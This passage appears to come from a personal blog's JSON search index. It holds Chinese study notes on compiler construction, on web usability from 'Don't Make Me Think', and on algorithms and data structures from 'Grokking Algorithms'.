目标代码改进 目标代码 修改后的目标代码 词法和语法分析 词法分析（即扫描器）：作用在于将源代码文件中的字符组成单词，作为下一阶段语法分析的输入，提高其处理效率；同时还会移除注释，并为单词增加行号和列号信息，方便出错的定位诊断； 语法分析：作用在于将单词组成一棵语法树；在这棵语法树中，每一种结构，例如表达式、语句、子程序等，分别可以对应树中的一个节点；每个节点下面还有各自的子节点，每个子节点需要符合当前节点的语法规则的顺序要求；任何不符合语法规则的单词和顺序，都会被抛出错误； 语义分析和中间代码生成语义分析的作用在于确定程序的意义，并构建出一棵抽象语法树；为了达到这个目的，它就构造一个符号表，将每个符号映射到关于该符号的所有已知信息，包括类型、内部结构、作用域等；有了符号表后，语义分析器就可以实施分析规则，确保整个程序是符合相关既定规则的；同时还可以知道哪些符号是重复引用相同的实体，因此它可以使用符号来构建出一棵更加简洁的语法树； 并非所有的语义规则都可以在编译时检查，有些需要延迟到运行时才能检查；前者称为静态语义，后者称为动态语义； 有些编译器的中间形式即是抽象语法树，而有些则是某种中间格式的语言； 目标代码生成有了抽象语法树后，生成正确的目标代码并不困难，只需使用目标语言来翻译这棵树即可；真正的挑战在于，如何生成“良好的”目标代码； 在生成目标代码后，理论上已经不再需要符号表了，但一般仍会保存起来，因为它有利于后续的调试使用； 代码改进改进即可以在生成目标代码之前进行，也可以在其后进行；不管哪一种，改进都是一项可选的工作，其作用在于提高程序的运算速度，或者减少资源的占用； 有些改进是机器无关，但也有些是与机器相关的；编译器可以根据程序要运行机器的特点，生成更高效的目标代码，例如利用超标量机器的并行运算能力； 第二章：程序设计语言的语法在编写一个程序时，涉及两种角色的人员，分别是普通业务程序员和编译器程序员； 前者关心使用正确的语法规则来表达业务的逻辑；而这些语法规则是由一组正则表达式+上下文无关的方法进行限定的； 后者关心如何解析前者编写的代码，了解其代码的结构和含义，以便将其转换成目标语言；后者通过使用扫描器+语法分析器来实现这个目标； 2.1 描述语法：正则表达式和上下文无关文法语法的表述需要某种形式化的规则；在实践中，通过三种形式化规则（拼接、选择、重复）来实现单词组合的集合；之后再使用“递归”来构建结构；二者一起共同完成了语法的表述； 单词和正则表达式单词是程序的基本组成单元，它的种类包括：关键字、标识符、符号和常量等； 注：标识符即各种自定义的变量名，用来代表各种实体； 一般使用正则表达式的记法形式来描述单词，例如： 12integel -&gt; digit digit*digit -&gt; 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 注：这才是正则表达式的用法起源，它原来用来规范化描述单词，之后才被延伸使用到各种语言和工具中； 不同语言使用的字符集可能有所差别，同时还会有一些格式上面的不同规定，例如最大长度限制、行截断的意义、缩进的意义等； 上下文无关文法在上下文无关文法中，用一条“产生式”来代表一条规则，例如： 12 id_list -&gt; id (, id)*op -&gt; + | - | * | / 产生式的左边是一个非终结符，而右边则是一个终结符；终结符一般是各种单词；终结符不能放在产生式的左边，因为终结符无法再进行分解； 注：该文法有时被称为 BNF 形式； 推导和语法分析树推导的目的是为了生成由终结符组成的终结符串；为了达到这个目的，可以有多种推导的方法，例如最右、最左、中间等；推导的结果可以表示成一棵语法分析树；但是，根据推导方法的不同，这棵树并不是唯一的；这意味着需要额外加入一些限制条件，才能消除这种歧义性； 2.2 扫描扫描器有如下的作用： 通过将字符转成单词，极大简化了语法分析器的输入项，使得语法分析器的设计复杂度大大降低； 删除了注释等不必要的干扰信息； 增加了行号、列号等信息，方便后续的出错调试； 2.2.1 生成一个有穷自动机什么是有穷自动机？答：它的全称是确定有限状态自动机(DFA)。自动机可以根据一个给定的状态和一个给定的字符，按照事先拟好的转移函数进行计算判断，然后转移进入下一个状态； 构造有穷自动机的方法有穷自动机可以手工编写，优点是没有冗余代码，执行效率比较高；缺点是一旦规则有增加或修改，维护起来的工作量很大； 自动机也可以用生成器来自动生成，只要给定一组正则表达式，生成器就可以自动帮忙构造出自动机； 自动生成器工作原理自动生成器一般经过三个步骤来生成 DFA epsilon 转换表示存在多种可能性的转换结果； 从正则表达式到 NFA：NFA 与 DFA 的不同点在于，它表示多种状态可能并行存在； 从 NFA 到 DFA：用状态集来表示一个节点，根据输入，转移到下一个状态集；若状态集中包含原 NFA 中的结束节点，则该状态集标记为结束状态； 最小化 DFA：先按状态集按终止状态和非终止状态分为两类；如果非终止状态类存在歧义，就逐步拆分它，直到不存在歧义为止；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"点石成金","slug":"点石成金","date":"2019-11-01T14:35:00.000Z","updated":"2024-09-22T23:08:41.997Z","comments":true,"path":"2019/11/01/点石成金/","permalink":"http://example.com/2019/11/01/%E7%82%B9%E7%9F%B3%E6%88%90%E9%87%91/","excerpt":"","text":"别让我思考 可用性第一定律：别让我思考；当用户看到一个页面时，它应该是不言而喻、一目了然、自我解释的； 页面上的每项内容都有可能迫使用户停下来进行不必要的思考；当用户困惑的地方很多时，就会加重他们的认知负担，把注意力从要完成的任务上转移开； 对于全新的东西，如果一个页面做不到不言而喻，则至少应该让它自我解释； 点击多少次都没有关系，只要每次点击都是无须思考、明确无误的选择； 当需要让用户进行过多思考的时候，他的注意力会从本来决定要选择什么，变成怀疑自己的兴趣到底有多大，质疑自己还是还有必要继续； 用户使用页面的真正方式扫描、满意即可、勉强应付； 事实1：我们不是阅读，而是扫描；原因： 我们总是任务在身，想要尽快完成任务； 我们知道自己只对一小部分内容感兴趣，所以不用阅读所有内容； 我们善于扫描； 用户的注意力一般放在以下文字或短语上面： 与手头任务有关的； 当前或接下来的个人兴趣； 脑海里一些根深蒂固触发器那样的词； 事实2：我们不做最佳选择，而是满意即可；用户不会花时间仔细权衡出最优的选择，而是会快速去尝试那个看起来过得去的选择；因为即使错了也没什么大不了的后果； 事实3：我们不是追根究底，而是勉强应付； 对于大多数人来说，只要能够正常使用，是否明白事物背后的运行机制并没有什么关系，人们并不关心； 一旦发现一个东西能用（不管有多难用），我们就会一直使用它，我们就不太会主动去找一种更好的方法，除非偶然被动的发现一种更好的方法； 一个易用的软件会让用户觉得自己很聪明，能够掌控全局，然后自我感觉良好； 为扫描而设计几个注意事项： 尽量利用习惯用法； 遵循习惯和惯例，即那些已经广为采纳或者已经标准化的设计模式； 如果想要创新，必须先理解想要取代的设计的价值；并确保新的设计同样清楚、同样不言而喻，没有学习曲线；能够带来很大的价值，因此值得用户付出一点努力来学习； 保持一致性往往是件好事；但简洁胜过一切，如果通过破坏一致性可以得到高度简洁的结果，而应果然选择简洁； 建立有效的视觉层次；确保页面所有内容的外观，能准确表述内容之间的关系；有效视层次的三个特点： 越重要的部分越突出；（突出） 逻辑上相关的部分，视觉上也相关；（分组） 逻辑上包含的部分，视觉上有嵌套；（嵌套） 把页面划分为明确定义的区域；明确定义的区域，可以让用户很快决定关注页面的哪些区域； 明显标识可以点击的地方；人们在页面上所做的大多数事情就是找到下一个地方进行点击； 最小化干扰，降低视觉噪声视觉噪声 眼花缭乱；所有的东西都在争夺用户的注意力； 组织不当：东西摆放的乱七八糟； 太过密集：内容太多； 应对方法有罪推定，先假定所有内容都是视觉噪声，并去除任何对页面没有帮助的内容； 为内容创建清楚的格式，以便扫描；充分使用标题原因：精心制作的标题可以起到页面大纲的作用或内容列表的作用，可以帮助用户决定哪些地方需要阅读、扫描或者直接跳过去； 保持段落简短原因：人们不喜欢阅读长篇的文字；如果段落太长，就找到合适的地方，把它裁成两段或多段； 使用符号列表列表的不同项目之间应该留出一点点额外的空白； 突出关键词语原因：大部分的页面扫描动作是在寻找关键字和关键短语； 有效的表单指引： 简短：只需提供最少的信息来帮忙我 及时：放在我正好需要它的地方； 不会错过：设置合适的格式，保证我一定会注意到它； 省略多余的文字 可用性第三定律：去掉每个页面上一半的文字，然后把剩下的文字再去掉一半； 好处： 降低页面噪声； 让有用的内容更加突出； 让页面更简短 方法： 消灭欢迎词； 消灭使用说明； 设计导航网站的特点 虚拟的网站缺少像物理空间感，因此我们只能通过概念层次上的位置，来定位某种东西；缺少空间感导致了主页、书签和后退按钮的重要性，同时也很容易让人注意不到时间的流逝，因为缺少了参照物； 主页就像是北极星，像一个固定的坐标，为用户提供了一次重新开始的机会； 导航的用途 帮助我们找到想要的东西； 告诉我们现在在哪； 告诉我们这里有什么； 告诉我们如何使用网站； 给了我们网站建造者的信心； 导航习惯用法持久导航它们在每个页面都处于相同的位置、相同的外观，除了表单页外； 四个组成要素： 站点ID：它应该出现在页面可视层次的首要位置；要么是本页最显眼的内容，要么让它涵盖页面所有其他元素； 栏目：主导航条，有时候它们也会包括下一级栏目清单（即二级导航）； 实用工具：例如注册、登录、站点地图、购物车、帮助等；不同的网站，实用工具会有所不同； 返回主页的链接； 搜索：一个输入框 + 一个按钮 + 一个单词（搜索）；应避免使用：花哨的用词、指示说明、选项（放在结果页去）； 页面名称 每个页面都需要一个名称； 页面名称需要出现在合适的位置； 名称要引人注目（正常它是页面中最大的文字）； 名称要和点击的链接一致，或者尽可能匹配； 你在这里告诉人们当前所在的位置； 面包屑导航的最佳实践： 把它放在顶层； 使用大于号 &gt; 对层级进行分隔； 加粗最后一个元素； 标签导航的最佳实践： 激活的标签页位于其他标签页之前； 激活的标签页与底下的空间在物理上连接起来； 好的导航应该能够回答以下问题： 这是什么网站？（网站ID） 我在哪个网页上？（当前网页名称） 这个网站的主要栏目是什么？（一级导航） 在这个层次上我有哪些选择？（本页导航） 我在导航系统的什么位置？（当前位置） 我怎么搜索？（搜索框） 设计主页主页的常见任务 站点标识和使命：这是什么网站、它是做什么的、为什么我应该在这里而不是别的网站； 站点层次：给出网站服务的内容和功能； 搜索 导读：暗示用户里面有精彩的内容； 内容推介：突出最新、最好、最流行的内容片段； 功能推介：邀请用户去探索更多的栏目或试和一些功能； 适时更新的内容：让用户觉得它不是一潭死水； 交换链接：放置广告、交叉推广、合作品牌的友情链接等； 快捷方式：最常访问的内容片段； 注册：提供注册链接，或者让用户知道自己已经处于登录状态； 主页的第一使命传达整体形象是主页的第一使命，因此要能够快速回答以下用户的四个问题 这是什么网站？ 网站有些什么？ 我能在这里做什么？ 为什么我应该在这里，而不是别的什么地方？ 大爆炸理论：最初的几秒最重要 如何传达信息放置陈述的三个重要位置 靠近网站 ID 处的口号； 欢迎广告； 了解更多；例如放上一段视频 传送信息的几条指导原则 需要多大空间就使用多大空间； 但是不要使用过多的空间； 不要把使命陈述当作欢迎广告； 最重要的是进行测试； 好口号的特点 清楚，言之有物； 长度合适，6~8个英文单词； 表述了网站的特点和显而易见的好处； 不好的口号听起来太笼统；别混淆口号和宗旨； 尽量有个性、生动； 第五个问题当用户明白网站的用途后，接下后的第五个问题是：从哪里开始？但问题常不在于让用户知道从哪里开始，而是开始的地点太多，即公共资源悲剧；避免公共资源悲剧的办法： 让所有的人都知道这个悲剧； 提供其他办法来缓解需求；例如热闹页面的推介，或者轮流使用主页上的同一空间 团队信仰冲突信仰问题的解决方式 问正确的问题：此情此景，某物是否让用户感觉更良好？ 用正确的方式回答问题：测试； 测试方法 固定每月一次； 每次一个上午； 每次三人； 宽松的招募条件；不一定必须是目标用户； 鼓励测试者尽可能的“说出心里话”； 越多人观察越好； 每场测试的间隔，观察者写下其注意到的三个最重要的可用性问题； 测试越早越好； 测试类型越多越好：草图、线框图、原型、成品等； 拟定要测试的任务清单； 准备措辞，让测试者知道希望他们做什么； 若测试者出现停顿，先等待，然后问对方在想什么、找什么、做什么？ 测试任务结束后，可以就测试中的事情，或者一些准备好的问题，向测试者提问； 修复问题 最严重的问题最先修复 抵制添加功能的冲动； 不要太看重人们对新功能的需求； 忽略皮划艇问题； 移动化设计 不要把提示隐藏在背后； 移动的网络可能不稳定，避免一次加载太多东西； 尽量避免需要让用户进行学习； 如果一定需要，务必让学习的内容容易记忆；避免下次进来再次学习； 赢得用户的尊敬为用户考虑，赢得用户的尊敬； 一些反面的做法： 隐藏用户想要的信息；例如客户电话、运费、价格等； 因没有按照既定的方式操作而惩罚用户，例如特定格式的输入； 向我询问不必要的信息； 敷衍我，欺骗我； 给用户设置障碍；例如不得不等待的长长的 Flash 介绍； 网站看上去不专业；例如看起来很凌乱，缺少组织； 一些正面的做法： 知道用户在你的网站上想做什么，并让它们简单且容易； 告诉用户想知道的； 尽量减少步骤； 花点心思； 知道用户可能会有哪些疑问，并且给予解答；例如保持更新的常见问题列表； 为用户提供协助； 容易从错误中恢复； 如有不确定，记得道歉； 可访问性改进可访问性的方法 改进让所有人感到混淆的可用性问题； 读一篇文章；Mary 和 Janice 的 《Guidelines for Accessible and Usable Web Sites》; 读一本书；Sarah 和 Whitney 的 《A Web for Everyone》 摘够得着的果子； 为每张图片添加合适的 alt 文本； 使用合适的标题； 让表单能够配合屏幕阅读器； 在每页的最前面添加一个“跳转到主要内容”的链接； 让所有的内容都可以通过键盘访问； 在文本和背景之间设置明显的对比； 采用一份可访问性良好的模板； 说服团队或老板有效的方法： 让老板或者他的老板来观看可用性测试； 在自己的个人时间进行第一次测试；找到一个容易修复的且严重的可用性问题；修复它，然后再进行公开和宣传； 对竞争对手进行测试； 理解管理层；理解他们的处境，给予情感上的关注； 弄清楚自己在整个公司大局中的位置 抵制黑暗行为； 一些禁忌 不要使用小而对比不强的字体； 不要把标签放到表单的字段里面； 保留访问过的链接和未访问的链接之间的区别； 不要让标题漂浮在段落之间","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"算法图解","slug":"算法图解","date":"2019-10-24T00:01:00.000Z","updated":"2024-09-22T23:08:43.586Z","comments":true,"path":"2019/10/24/算法图解/","permalink":"http://example.com/2019/10/24/%E7%AE%97%E6%B3%95%E5%9B%BE%E8%A7%A3/","excerpt":"","text":"算法简介算法只是一组完成任务的指令，任何代码片段都可以视为算法； 二分查找当数据是有序的时候，使用二分查找可以在对数时间内得到结果； 对数是幂运算的逆运算 大 O 表示法大 O 表示法用来表示算法运行时间的增速； 注意：它是代表增速； O(log n)：对数时间 O(n)：线性时间 O(n * log n) O(n^2) O(n!) 选择排序当要在内存中存储多项数据时，需要用到数组或者链表的数据结构； 数组 使用数组时，意味着数据在内存必须是连续存放的；因此，当给数组添加元素，导致超过可用连续段的数据时，则需要重新寻找一个新的连续段，并将数据复制过去； 一个折中的办法是提前预留一些空间，这样可以避免降低转移的机率，代价是浪费一些空间；即以空间换时间； 数组的优点是访问速度快，但插入速度有可能比较慢（当发生转移的时候，或者例如把元素插入在头部的时候）； 由于使用虚拟内存映射物理内存，当虚拟内存发生转移的时候，或者有可能物理内存的内容不需要发生转移，只需要更改页表的映射即可？ 链表 使用的链表的好处则在于当添加新元素时，完全不需要移动旧元素的位置；只需随便找个空位置存放新数据，然后将地址放在上一个元素中即可； 链表的优点是插入速度快，但访问速度慢；但如果刚好是要读取所有元素，则链表的效率还是很高的； 数据结构所谓的数据结构，其实跟内存有很大的关系，当数据存放在内存中的时候，需要有一种地址计算机制，以便找到这些元素； 数组通过记住头元素的地址，然后按顺序索引的方式计算出另一个元素的地址； 链表通过头元素的地址，顺序向下查找，直到找到所需的元素； 对于二叉树，其实现机制是否让每个元素存放左右两个分支的地址，分别代表某种条件判断真假后的相应分支？待验证； 数组和链表各有其优缺点，因此还可以通过将二者进行结合的方式来存储数据，这样可以兼顾二者的优点； 选择排序每次遍历一轮，从中挑出最大或者最小的元素，放入一个有序的新列表中； 这种方法的缺点是需要遍历很多轮，导致运行时间为 O(n2)；有没有可能只遍历一轮，然后通过建造一个二叉树的方式，来存放遍历结果？在纸上试画了一下，貌似不太行； 递归 栈也是一种数据结构，以前没有太明白这句话的意思，但当它和数据存储以及寻址提取的需要进行联系时，它就变得非常容易理解了；对于栈的使用，我们只需要记住栈顶的指针，压栈和出栈的时候，向不同的方向改变栈顶指针的地址即可； 函数在返回的时候，需要将原调用者中断指令的地址，发给程序计数器，以便接下来跳转到中断处继续执行原调用者余下的指令，同时，还要改变栈顶的指针，使其指向原调用者的栈桢的顶部；而在一开始时调用函数的时候，除了发生了跳转外，还需要有保存当前指令的地址到栈中，而被调用的函数，会将栈指针（即栈桢的顶部地址）保存到寄存器 %ebp 中； 出栈和入栈的动作，在指令的眼里，实际上是通过 add 和 sub 来改变栈顶指针数值大小的动作；通过 add 和 sub 来申请和释放栈空间； 栈是一块动态分配的内存空间，用来存储一些临时的数据；栈被划分成多个栈桢，每个栈桢对应一次函数调用，栈桢中存储着该次函数调用的一些临时变量；每个栈桢有一个顶部地址（栈指针）和底部地址（桢指针）；当分配新栈桢的时候，原栈桢的顶部地址，就变成了新栈桢的底部地址；CPU 中有两个寄存器 %esp 和 %ebp，分别存储着当前栈的顶部和底部的指针值； 当发生函数调用的时候，会将函数参数、返回地址、桢指针值，放在当前栈桢的顶部，然后进入下一个新栈桢；事实上，所谓的栈桢也只是逻辑上存在的，编译器小心的维护桢顶和桢底的地址来实现相应的目的； 寄存器的空间是有限的，为了在这有限的空间内，完成每一次的函数运算，它需要内存（虚拟内存）配合，帮忙保存一些状态数据和中间数据，这样 CPU 才可以完成不同函数之间的调用和返回的切换；而栈的使用以及栈顶和栈底指针，可以让代码使用相对地址进行偏移量计算，因为有些变量的长度是动态的，所以并不能在编译的时候直接使用绝对地址； 快速排序 分而治之的策略（想起了费曼技巧，将大问题拆解成小问题）； 欧几里得算法：求两个整数 A 和 B 的最大公约数 GCD(A, B)，可以转换为求 A&#x2F;B 的余数 与 B 的最大公约数，假设 A &#x3D; B * n + R，则 GCD(A, B) &#x3D; GCD(B, R)； 递归算法 定义基线条件； 缩小问题规模，直到其符合基线条件； 编写涉及数组的递归函数时，基线条件一般是空数组或只包含一个元素； 快速排序选择一个基准值，将数组拆分成比它小和比它大的两组，然后对每一组各自进行递归，并合并最后的结果； 快速排序平均运算时间为 O(n * logn)，最糟糕的情况是 O(n * n)，最佳情况是 O(logn)； 合并排序的运算时间固定为 O(n * logn)；表面上看貌似比快速排序更好，但事实上其单次的运算时间比快速排序多，导致最后的总运算时间比快排多； 大 O 表示法中所谓的运算时间，其真实含义其实是运算次数；但不同算法的单次运算所需的时间有可能是不同的； 散列表 散列函数：无论给这个函数什么样的输入，它都会输出一个数字； 散列表的其他名称：散列映射、映射、字典、关联数组； 问题：对于 Python 中的字典来说，它如何确保不同的键名的散列数字不会冲突？答：冲突不可避免，解决方法有多种；其中一种方法是在存储位置放置一个链表，来拓展可存储的空间；但链表也不适宜太长，不然会降低搜索性能，当链表很长的时候，需要采用其他方法，甚至重新设计散列表本身的长度，同时确保它的散列结果均匀分布； 问题：猜测散列表是一种用空间换时间的方法？ 散列函数的实现 散列表使用数组来存储数据；既然是数组，意味着其存储空间是连续的；当需要存储的数据个数，超过了预分配的空间时，可能会发生迁移的情况？答：没错，它使用装填因子来触发迁移，一般控制在 0.7；当超过0.7时，就将数组的长度增加为原来的2倍； 填装因子：要存储的数据个数 &#x2F; 数组的长度；填装因子越小，发生冲突的概率就越低； 广度优先搜索 解决最短路径问题的算法，一般使用广度优先搜索；使用图来建立数据模型，使用队列建立搜索列表； 图由节点和边组成，它用来描述哪些节点与哪些节点之间存在连接； 当有了节点和边后，可以通过搜索一个节点所关联的第1级节点，第2级节点……第n节点，来判断一些想要的结果；例如先搜索自己的朋友，再将朋友的朋友也加入搜索的范围；这便是广度优先搜索；（听上去像是一种暴力算法） 有向图：节点间的关系是单向的，图中的边会带有箭头；无向图的边则没有箭头； 广度优先搜索的运算次数为 O(v+e)，其中 v 表示 vertice 节点数，e 表示 edge 边数； 树也是一种图，只是这种图比较特殊，它没有往回指的边； 狄克斯特拉算法广度优先算法可以用来寻找边数最小的路径；狄克斯特拉算法可用来寻找消耗时间最短的路径（相当于给边分配了权重，然后找出总权重值最小的路径） 狄克算法描述从起点出发，罗列出所有余下节点的权重开销，对于不可达的节点，设定其开销为无穷大；依次遍历开始位置的节点的邻居，计算其到达余下节点的开销（需计入起点到当前节点的历史开销），如有比原开销更短的路径，更新其开销；重复该步骤，直到遍历完所有节点； 有权重的图称为加权图，没有权重的图称为非加权图； 无向图中，每条边都是一个环，狄克算法只适用于有向无环图； 狄克算法有一个基本假设，即已经处理过的节点，没有前往该节点的更短路径，这种假设仅在没有负权重边时才成立；因此狄克算法不能用于处理有负权边的情形；此时需要使用贝尔曼-福德算法； 狄克算法实现数据结构 新建一个子节点散列表，保存每个节点及其邻居（作为节点的属性，并将权重做为属性值）； 新建一个开销散列表，保存到达当前节点的最短路径开销； 新建一个父节点散列表，保存每个节点的最短路径父节点； 新建一个节点数组，记录已经处理过的节点； 算法实现 遍历所有未处理的节点； 计算每一个未处理节点，到达下一个邻居节点的累积路径开销； 如果当前节点到达下一个邻居节点的路径开销，比现已知的到达该邻居节点的路径开销更小，则更新开销表中下一个节点的最短路径开销值； 遍历完当前节点的所有可达邻居节点后，将当前节点加入已处理列表中； 重复第二步，计算下一个未处理节点； 贪婪算法 贪婪算法：每步采用局部最优解，以期最终得到全局最优解；虽然最终不一定能得到，但会相当接近；因此，贪婪算法不是完美答案的算法，但是一种简单的算法； 旅行商问题：找出最短路径的组合； 随便选择一个出发城市 选择出发去下一个城市时，选择最近的还没有去的城市； 集合覆盖问题：找出覆盖所有州的最小电台集合； 从剩余可选电台中，找出覆盖最多未到达州的电台，放入候选列表； 重复第一步； 判断是否 NP 完全问题的一些潜在迹象 涉及所有组合； 随着元素数量增加，计算量急剧上升； 不能将问题分解成小问题； 涉及序列且难以解决（如旅行商问题）； 涉及集合且难以解决（如电台问题）； 可转换为集合覆盖问题或旅行商问题； 对于 NP 完全问题，最佳的做法是使用近似算法； 找出满足球队最佳组合的球员，原理也跟电台问题一样； 动态规划 动态规划原理：先解决小问题，再解决大问题；可用来寻找给定约束条件下的最优解；每种动态规划方案都涉及网格，每个单元格都是一个子问题；根据问题不同，计算动态规划方案的公式不同，没有统一的公式，需要根据问题定制化设计； 案例：4公斤的背包，偷盗最有价值商品的组合； 方法：先找出背包容量只有1公斤、2公斤、3公斤等情况下的最佳组合（即大问题先转换为小问题来解决）；然后在4公斤的时候，就可将其转换成当前新选择+余下容量最佳组合的和，来得到最终解；如果新选择的容量和没有大于旧选择的容量和，则以旧选择为准，放弃新选择； 如果商品单位不是整件，而是可以部分，例如大米，则动态规划算法不适用，但此时可以使用贪婪算法； 动态规划算法的前提是各个选项之间是独立的，不存在相互依赖的关系；如果某些选择之间有依赖关系，则动态规划方法不适用； 单词最匹配预测：寻找最大公共子串问题； 既然是公共子串，那意味着最低限度也要有一个字符相同，这样才谈得上有公共的部分； 当有一个字符相同时，如果前面还有一个相同的字符，则构成了2个相同字符的字串；如果前面的字符不同，则只构成一个相同字符的子串； 最长公共子串不一定出现在单词的末尾，它也可以出现在单词的中间； 单词最匹配预测：寻找最大公共子序列问题：与寻找最长公共字串的算法略有不同： 当存在一个相同字符时，该单元格标注为左边或上边邻居中较大的值加1； 当存在不同的字符时，该单元格标注为左边或上边邻居中较大的值； K最近邻算法 K最近邻算法即 KNN，全称 K nearest neighbor； 当要给某个东西分类时，查看离它最近的3个邻居，如果其他有2个邻居是 A 类物品，则该东西很可能是 A 类物品； 如何计算 A 和 B 点的距离？将物品进行特征建模，每个特征做为一个维度，这样物品就可以转换成空间维度中的坐标，然后使用勾股定理计算两点之间的距离； KNN 可以用来实现两项基本工作：分类（即分组）和回归（即预测结果）； 计算相似度除了使用距离来比较，还可以使用余弦相似度来比较，它比较的是角度，而不是距离；当每个人打分的标准不同时，使用余弦相似度会更加适合； 余弦相似度与向量的长度无关，而只是方向有关，它的取值在 -1 到 1 之间；当夹角为0度是，相似度为1；当夹角为90度时，相似度为0，当夹角为180度时，相似度为 -1； 对于 KNN 算法，挑选合适的分类特征很重要，需要确保这些特征能够准确反应事物的属性，同时又与要解决的问题相关； OCR、语音识别、人脸识别都是使用 KNN 算法原理；它从数据集中提取特征，然后根据特征建模，找到分类标准；这样当有新的数据进来时，提取新数据的特征，依据标准对数据进行分类； 依据特征统计分类标准的过程，即为训练； 朴素贝叶斯分类器 Naive Bayes Classifier； 朴素贝叶斯常用于文本分类领域；文本分类一般以词频为特征，判断文件所属的类型（例如垃圾邮件、政治、体育、合法等）； 接下来如何做树有序数组的优点是查找非常快，平均都是 O(logN)，但它的缺点是插入和删除非常慢，平均都是 O(n)；为了克服这种缺点，引入了二叉查找树的数组结构，它的特点是每个节点都两个子节点，左边节点存储比它小的值，右边节点存储比它大的值；对于二叉树，它的平均查找、插入、删除的时间都是 O(logN)（当然，前提是这是一棵平衡的二叉树，如果不平衡，而性能达不到 O(logN)； 数据库和文件系统常使用 B 树来存储数据；它适用于读写相对大的数据块，因为 B 树的节点支持一定的范围的关键字，刚好跟磁盘读写单元块相对应，所以读写效率比其他树结构来得高； 其他常用的树结构还包括：红黑树、伸展树、B+树、B* 树等； 平衡二叉树（AVL树） 每个节点最多允许拥有2个子节点； 左子节点的值小于当前节点，右了节点的值大于当前节点； 左右两边的节点层级差不大于1（如何做到？通过对树进行左旋或者右旋来实现） 左旋 右旋 B 树一种自平衡的树（不二叉，而是多叉），能够保持数据有序； B 树的每个节点可以拥有2个以上的子节点； 子节点的数量范围预先定义好（例如 2-4 B树，表示允许 2-4个子节点） 当发生数据插入或删除时，如果超过范围，会触发内部节点的拆分或合并；拆分或合并后都需要满足左边节点本身比左边节点大，比右边节点小的排序规则； 由于有一定的范围，所以不需频繁的调整以保持平衡； 但缺点是节点可能没有完全填充，会浪费一定的空间（以空间换时间）； 节点除了存储关键字外，还需要存储子节点的地址；二者的数量差不多均分； 查找示例查找字母 E，则依次比较根节点M，然后二级节点DG，盱 D&lt;E&lt;G，所以沿中路分支，在三级节点查到 E； 插入示例假设要构建的为 5 阶树，则当关键字必须&lt;&#x3D;(5-1)即小于等于4，意思是当关键字数超过4时，需要进行节点拆分；现在模拟插入3、8、31、11、23、29、50、28 先插入 3、8、31、11 再插入23、29 再插入50、28 删除示例假设为5路查找树，由于 m &#x3D; 5，因此关键字数必须 &gt;&#x3D; (ceil(5&#x2F;2) -1) 为 2，所以当关键字小于2时，会触发合并； 删除数字 28 B+树B 树的升级版，由于更充分的利用了节点的空间，使得其查询速度更快； 与 B 树的区别如下： 非叶子节点不再保存关键字，只保存索引值和子节点地址；这样每个节点可保存的数据就增加了很多； 查找时，根据索引值判断应选择的子节点分支； 由于每个子节点可保存的内容变多，导致树的高度层级变少，所以查询性能更好； 所有数据都存储在叶子节点上；而且由于是有序的，所以遍历全表的时候，只需扫描所有叶子节点即可，不用遍历非叶子节点；方便数据库做全表扫描； 同时在查询大小区间的数据时，也更方便； B* 树B* 树是 B+ 树的变种，它与 B+ 树的区别有两点： 当某个节点满了后，它不会马上拆分，而是会先检查一下兄弟节点是否已满； 若未满，则向兄弟节点转移元素； 若已满，则进行拆分；从自身和兄弟节点中，各拿出三分一的元素来组成一个新的节点； B* 树每个节点存有兄弟节点的指针； 由于有向兄弟节点转移元素的功能，使得 B* 树的拆分频率比 B+ 树要小一些； 红黑树红黑树是另外一种自平衡的二叉树； AVL 树的约束是高度差不大于1，这样会导致插入或删除时频繁发生旋转；红黑树则放松了这方面的限制，它通过引入颜色属性，并增加一些与颜色相关的约束条件来控制平衡； 红黑树通过牺牲了部分平衡性，来换取插入&#x2F;删除操作时更少的旋转操作，从而在整体上性能优于 AVL 树； 约束条件： 根节点必须是黑色的； 所有 NIL 叶子节点也都是黑色的； 每个红色节点必须有两个黑色的子节点； 从叶子节点到根节点的路径上，不能有两个连续的红色节点； 任一节点到其每个叶子的所有路径都包含相同数目的黑色节点； 虽然红黑树的插入&#x2F;删除触发的旋转不如AVL频繁，但是一旦触发，其引起的颜色变更和旋转要复杂得多，但操作时间仍可控制在 O(log n) 次； 字典据说主要使用红黑树来实现，好奇是如何做的？ 变色 左旋 右旋 伸展树 伸展树也是一种自平衡的二叉树；它基于理念：越是被频繁访问的元素，应该离根节点越近，以便提高查找速度； 因此，每次查找后，伸展树会进行一系列旋转操作，让被访问节点更靠近根节点； 优点：性能不输于平衡树；存储空间小（因为不需要存储保持平衡的额外信息）； 缺点：在极端情况下会变成链；在多线程的情况下会变得很复杂； 反向索引 正向索引是通过键找到值，反向索引是对值进行排序，然后根据值找到键； 它可用来做为网页搜索引擎的算法；对搜索的关键字进行反向索引，当用户输入关键字后，根据关键字索引，查找到包含这些关键字的网页； 傅里叶变换 作用类比： 给它一杯冰沙，它可以告诉我们其中包含哪些成分； 给它一首歌曲，它可以告诉我们其中包含哪些频率； 傅里叶变换很适合用来对各种信号进行处理，包含音乐、图片、各种波等； 并行算法并行算法的设计并行算法的设计需要考虑两个问题 并行性管理：如何合并并行计算的结果； 负载均衡：确保任务分配相对均匀，各自的任务完成时间大致相同； MapReduce一种分布式算法，可以将计算任务分配到多台计算机上分布计算； Map 函数（映射）：接受一个数组，对里面的每个元素进行相同的处理； Reduce 函数（累计）：将每次的处理结果进行累计； 布隆过滤器可用于判断某个元素是否存在于某个巨大的集合中； 优点：需要的存储空间比散列表小很多； 缺点：它可能会出现错报（伪阳性，false positive），但不会漏报（伪阴性，false negative）； 原理：初始化一个长度为 m 的位数组，挑选 k 个哈希函数，用来将输入值转换成 k 个位结果； 查询过程：判断哈希函数生成的每个位结果，在 m 数组中相应的位上的值是否为 1，若都为 1，则表示值可能存在于集合中；若有一个为 0，则表示值在集合中一定不存在； 写入过程：根据哈希函数生成的每个位结果，将 m 数组中相应的位上的值置为 1； 哈希函数的数量 k，以及数组的长度 m 会涉及误报率 p；m 越大，k 越小，则 p 越小；m 越小，k 越大，则 p 越大； 